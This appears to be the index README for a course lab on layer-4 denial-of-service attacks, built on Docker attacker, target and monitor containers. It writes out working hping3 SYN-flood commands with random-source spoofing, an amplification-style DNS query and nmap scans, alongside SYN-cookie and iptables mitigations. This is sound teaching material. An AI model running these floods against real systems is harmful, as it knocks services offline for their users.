# 🔄 Pertemuan 6: L4 Security - Lab Index

**Status:** ✅ Ready to Use  
**Last Updated:** 2025-10-27

---

## 📁 Folder Contents

### docker-compose.yml
- **Purpose:** Docker configuration untuk L4 Security lab
- **Services:**
  - `attacker-l4` (Kali with hping3, scapy)
  - `target-webserver` (Nginx on port 80)
  - `target-udp` (DNS service on port 5353/UDP)
  - `monitor-l4` (Monitoring container)
- **Network:** 192.168.60.0/24
- **Start:** `docker-compose up -d`

### README.md
- **Purpose:** Setup guide dan lab workflow
- **Contains:**
  - SYN flood attack tutorial
  - UDP amplification guide
  - Mitigation testing (SYN cookies)
  - Real-time monitoring instructions

### captures/
- **Purpose:** PCAP files dari attacks
- **Usage:**
  ```bash
  tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -w synflood.pcap
  docker cp monitor-l4:/tmp/synflood.pcap captures/
  ```

### scripts/
- **Purpose:** Custom attack scripts
- **Future:** Add syn_flood.py, udp_amplification.py

### configs/
- **Purpose:** Nginx configuration, firewall rules

---

## 🚀 Quick Start (SYN Flood)

```bash
# 1. Start lab
docker-compose up -d

# 2. Open 3 terminals

# Terminal 1: Monitor packets
docker-compose exec monitor-l4 bash
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -c 100

# Terminal 2: Monitor server state
docker-compose exec target-webserver bash
watch -n 1 "netstat -atn | grep SYN_RECV | wc -l"

# Terminal 3: Launch attack
docker-compose exec attacker-l4 bash
hping3 -S --flood --rand-source -p 80 192.168.60.3

# Stop attack with Ctrl+C after 10-15 seconds

# Cleanup
docker-compose down
```

---

## 📚 Next Steps

1. **Read:** [Pertemuan6.md](../Pertemuan6.md) - Full theory + hands-on
2. **Follow:** Hands-on sections (starting from section 5)
3. **Practice:**
   - SYN flood attacks
   - TCP state monitoring
   - UDP amplification
   - Port scanning
   - Mitigation strategies
   - SYN cookies
   - Rate limiting

---

## 💡 Key Tools Available

- **hping3:** Advanced ping/packet injector
- **tcpdump:** Packet capture
- **netstat:** Connection statistics
- **nmap:** Port scanning
- **Scapy:** Packet crafting
- **tshark:** Wireshark CLI

---

## 📊 Lab Topology

```
Docker Network (192.168.60.0/24)
├── attacker-l4 (192.168.60.2)
│   └── Tools: hping3, scapy, netcat
├── target-webserver (192.168.60.3:80)
│   └── Nginx web server
├── target-udp (192.168.60.4:5353/UDP)
│   └── DNS service (amplification)
└── monitor-l4 (192.168.60.5)
    └── Monitoring/Analysis
```

---

## 🎯 Attack Scenarios

### SYN Flood with hping3
```bash
# Basic flood
hping3 -S -p 80 192.168.60.3

# With continuous flood
hping3 -S --flood -p 80 192.168.60.3

# With IP spoofing (random source)
hping3 -S --flood --rand-source -p 80 192.168.60.3

# With custom rate
hping3 -S -p 80 --rate 1000 192.168.60.3
```

### UDP Amplification
```bash
# DNS query
nslookup @192.168.60.4 -port=5353 google.com

# SNMP walk
snmpwalk -c public 192.168.60.4
```

### Port Scanning
```bash
# SYN scan
nmap -sS 192.168.60.3

# UDP scan
nmap -sU 192.168.60.4
```

---

## 🔧 Mitigation & Testing

### Enable SYN Cookies
```bash
docker-compose exec target-webserver bash

# Enable
sysctl -w net.ipv4.tcp_syncookies=1

# Verify
sysctl net.ipv4.tcp_syncookies  # Should return 1
```

### Rate Limiting with iptables
```bash
docker-compose exec target-webserver bash

# Limit new SYN connections
iptables -A INPUT -p tcp --syn -m limit --limit 10/s -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
```

### Test Attack Effectiveness
```bash
# Before mitigation: ~100+ SYN_RECV
# After mitigation: <10 SYN_RECV
# Impact: Legitimate clients can still connect
```

---

## 📊 Expected Results

### SYN Flood Observations
- **Without mitigation:**
  - SYN_RECV grows to 1000+
  - Server becomes unresponsive
  - New connections refused
  - tcpdump shows constant SYN flood

- **With SYN cookies:**
  - SYN_RECV stays low
  - Server remains responsive
  - Legitimate clients connect normally
  - Performance slightly degraded

---

## 🔐 Security Notes

- All attacks confined to 192.168.60.0/24
- No impact on external networks
- Safe for learning and experimentation
- Demonstrates real-world DoS impact

---

## 📝 What You'll Learn

- ✅ TCP three-way handshake
- ✅ SYN flood mechanism and impact
- ✅ Server resource exhaustion
- ✅ TCP state machine
- ✅ SYN_RECV connection states
- ✅ UDP amplification attacks
- ✅ Mitigation strategies (SYN cookies, rate limiting)
- ✅ Real-time monitoring with netstat
- ✅ Packet analysis with tcpdump

---

## 💾 Data Collection

### Before Attack
```bash
# Get baseline
netstat -atn | wc -l           # Total connections
netstat -atn | grep ESTABLISHED | wc -l
```

### During Attack
```bash
# Monitor in real-time
watch -n 0.1 "netstat -atn | grep SYN_RECV | wc -l"
```

### Analysis
```bash
# Save tcpdump for later analysis
docker cp monitor-l4:/tmp/synflood.pcap captures/

# Open in Wireshark
wireshark captures/synflood.pcap
```

---

**Ready to start?** Run `docker-compose up -d` and follow the hands-on guide!
